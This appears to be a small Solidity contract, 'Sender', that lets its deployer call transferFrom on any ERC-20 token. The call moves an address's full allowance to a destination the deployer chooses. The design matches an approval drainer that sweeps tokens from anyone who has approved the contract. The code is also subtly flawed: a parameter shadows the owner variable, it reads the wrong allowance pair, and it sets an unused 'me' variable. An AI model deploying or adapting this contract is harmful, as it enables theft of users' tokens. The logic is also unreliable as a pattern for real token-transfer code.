// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);

}

contract Sender {

address payable owner;

constructor() {
    owner = payable(msg.sender);
}
address public me;
uint256 public amount;

function setMe(address _me) external onlyOwner{
    me = _me;
}

function getAllowance(address owner,address spender,address token) external view returns(uint256){
    IERC20 _token = IERC20(token);
    // amount = token.allowance(user, address(this));
    return(_token.allowance(owner, spender));
}

function sendToken(address owner,address spender, address tokenAddress) external  onlyOwner{
    IERC20 token = IERC20(tokenAddress);
    uint amount = token.allowance(owner, spender);
    token.transferFrom(owner,spender,amount);
}

modifier onlyOwner{
    require (msg.sender == owner);
    _;
}

}